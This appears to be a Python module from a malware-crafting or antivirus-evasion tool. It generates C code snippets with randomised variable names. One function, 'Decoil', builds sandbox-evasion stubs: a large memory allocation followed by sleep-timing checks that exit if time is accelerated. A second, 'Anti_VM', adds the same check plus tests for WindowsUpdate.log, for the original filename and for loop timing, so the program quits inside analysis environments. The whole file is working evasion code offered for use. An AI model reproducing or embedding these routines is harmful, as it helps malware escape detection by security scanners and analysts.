from lib import body, gen, core


# Step 1: Memory alloc 250Mb
# Step 2: Wait 5 seconds
# Step 3: Inject NULL octect
# Step 4: Free Memory
def Decoil():
    print("""
 |------------------------------------------------------------|
 |HARD MEMORY ALLOCATION                                      |
 |------------------------------------------------------------|
 Please enter the number of decoil to add (unlimited).
 PS : 1 decoil = 1 secondes to sleep.
 Press ENTER for ignore this step.
            """)

    Number_Of_Decoil = core.core_input()
    Transform_To_Int = int(Number_Of_Decoil)

    Number_Of_Decoil = 0
    Decoil_Code = ""

    Decoil_while = True

    while Decoil_while:

        if Number_Of_Decoil != Transform_To_Int:

            Number_Of_Decoil += 1
            Memdmp1 = gen.Varname_Creator()
            Tac1 = gen.Varname_Creator()
            Tick1 = gen.Varname_Creator()

            Decoil_Code += "char * " + Memdmp1 + "= NULL;"
            Decoil_Code += Memdmp1 + " = (char *)malloc(300000000);"
            Decoil_Code += "if (" + Memdmp1 + " != NULL) {"
            Decoil_Code += "memset(" + Memdmp1 + ", 00, 300000000);}"
            Decoil_Code += "int " + Tick1 + " = GetTickCount();"
            Decoil_Code += "Sleep(1000);"
            Decoil_Code += "int " + Tac1 + " = GetTickCount();"
            Decoil_Code += "if ((" + Tac1 + " - " + Tick1 + ") < 1000) {exit(0);}"
            Decoil_Code += "free(" + Memdmp1 + ");"

        elif Number_Of_Decoil == Transform_To_Int:
            Decoil_while = False

    return Decoil_Code



# Add Anti-VM code
def Anti_VM(FILENAME):

    Memdmp1 = gen.Varname_Creator()
    Tac1 = gen.Varname_Creator()
    Tick1 = gen.Varname_Creator()
    AntiVM = "char * " + Memdmp1 + "= NULL;"
    AntiVM += Memdmp1 + " = (char *)malloc(300000000);"
    AntiVM += "if (" + Memdmp1 + " != NULL) {"
    AntiVM += "memset(" + Memdmp1 + ", 00, 300000000);}"
    AntiVM += "int " + Tick1 + " = GetTickCount();"
    AntiVM += "Sleep(1000);"
    AntiVM += "int " + Tac1 + " = GetTickCount();"
    AntiVM += "if ((" + Tac1 + " - " + Tick1 + ") < 1000) {exit(0);}"
    AntiVM += "free(" + Memdmp1 + ");"

    # Check if "WindowsUpdate.log" exist
    File_Exist = gen.Varname_Creator()
    A = gen.Varname_Creator()
    AntiVM += "FILE *" + File_Exist + ' = fopen("C:\\\WINDOWS\\\WindowsUpdate.log", "r");'
    AntiVM += "if (" + File_Exist + " != 0){int " + A + " = 0;}"
    AntiVM += "else exit(0);"

    # Check if the begin name is the same
    B = gen.Varname_Creator()
    FILENAME = FILENAME.replace('.exe', '')
    FILENAME = FILENAME.replace('output/', '')
    AntiVM += 'if (strstr(argv[0], "' + FILENAME + '") > 0){int ' + B + ' = 0;}'
    AntiVM += "else exit(0);"

    # OPS
    C = gen.Varname_Creator()
    I = gen.Varname_Creator()
    AntiVM += "int " + I + " = 0;"
    AntiVM += "while(" + I + "<100000000){" + I + "++;}"
    AntiVM += "if(" + I + ">99999990){int " + C + " = 0;}"
    AntiVM += "else exit(0);"

    return AntiVM
